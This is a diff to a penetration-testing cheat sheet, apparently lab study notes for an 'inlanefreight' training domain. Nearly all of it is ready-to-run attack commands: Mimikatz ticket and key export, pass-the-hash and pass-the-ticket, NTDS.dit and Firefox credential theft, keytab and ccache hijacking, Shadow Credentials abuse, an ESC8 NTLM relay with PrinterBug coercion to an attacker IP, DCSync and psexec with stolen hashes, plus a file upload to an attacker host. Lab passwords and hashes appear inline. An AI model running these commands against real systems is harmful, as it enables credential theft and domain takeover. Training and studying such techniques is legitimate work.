@@ -1,5 +1,13 @@
 # Cheet Sheet
 
+## Site
+
+### Reverse Shell Generator
+https://www.revshells.com/
+
+### Crack password on website
+https://crackstation.net/
+
 ## Crawling
 ### python
 python3 ReconSpider.py http://inlanefreight.com
@@ -12,7 +20,6 @@ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",fi
 
 ### fuff
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://94.237.48.60:57525/ -H "Host: FUZZ.inlanefreight.htb" -fs 116
-
 
 ### Gobuster
 gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -113,4 +120,92 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ### Cracking the NT Hash
 sudo hashcat -m 1000 <NT Hash> /usr/share/wordlists/rockyou.txt
 
+### Capture the NTDS.dit
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
+### Firefox decrypt
+git clone https://github.com/unode/firefox_decrypt?tab=readme-ov-file
+python3.9 firefox_decrypt.py
+
+
+### Mimikatz - Export Windows tickets
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+
+### Mimikatz - Extract Kerberos keys
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+
+### Mimikatz - Pass the Key aka. OverPass the Hash
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+### Mimikatz - Pass the Ticket
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+
+### Finding KeyTab files
+find / -name *keytab* -ls 2>/dev/null # need privileges
+crontab -l # possibly included files hint
+
+### Finding ccachse files
+env | grep -i krb5
+
+### Impersonating a user with a KeyTab
+david@inlanefreight.htb@linux01:~$ klist 
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: david@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/07/22 17:02:11
+david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+### Extracting KeyTab hashes with KeyTabExtract
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+
+### Importing the ccache file into our current session
+root@linux01:~# klist
+
+klist: No credentials cache found (filename: /tmp/krb5cc_0)
+root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
+root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+root@linux01:~# klist
+Ticket cache: FILE:/root/krb5cc_647401106_I8I133
+Default principal: julio@INLANEFREIGHT.HTB
+
+### Evil-winrm with nltk hash
+evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
+
+### Linikatz (Linikatz brings a similar principle to Mimikatz to UNIX environments)
+[!bash!]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+[!bash!]$ /opt/linikatz.sh
+
+## Shadow Credentials (msDS-KeyCredentialLink)
+### wwhiteの認証情報を使って、jpinkmanのアカウントに公開鍵を登録
+pywhisker --dc-ip 10.129.43.32 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add]
+### 偽造した証明書を使って、jpinkmanのKerberos認証チケット（TGT）を取得
+python3 gettgtpkinit.py -cert-pfx ./2dTwvsdf.pfx -pfx-pass 'jtbu8vTGJBGSkA4jtx2S' -dc-ip 10.129.43.32 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+### /etc/krb5.confを編集して、ドメインとKDCの情報を設定
+### kdc = 10.129.43.32 と設定することで、ホスト名解決の問題を回避
+### 
+### Kerberos認証チケットのパスを指定
+export KRB5CCNAME=/tmp/jpinkman.ccache
+### TGTを使って、jpinkmanとしてドメインコントローラーにリモート接続
+### /etc/hostsも編集してDNS解決を補助
+evil-winrm -i 10.129.43.32 -r INLANEFREIGHT.LOCAL
+
+## AD CS NTLM Relay Attack (ESC8)
+### AD CSサーバーをターゲットに、認証中継サーバーを起動
+impacket-ntlmrelayx -t http://10.129.227.10/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+### ドメインコントローラーに、攻撃者のマシンへの認証を強制
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.53.88 <attacker_ip>
+### 取得したドメインコントローラーのTGTを使って、DCSync攻撃を実行
+impacket-secretsdump -k -no-pass -dc-ip 10.129.180.85 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+### 抜き出したAdministratorのNTLMハッシュを使って、リモート接続
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c Administrator@10.129.53.88
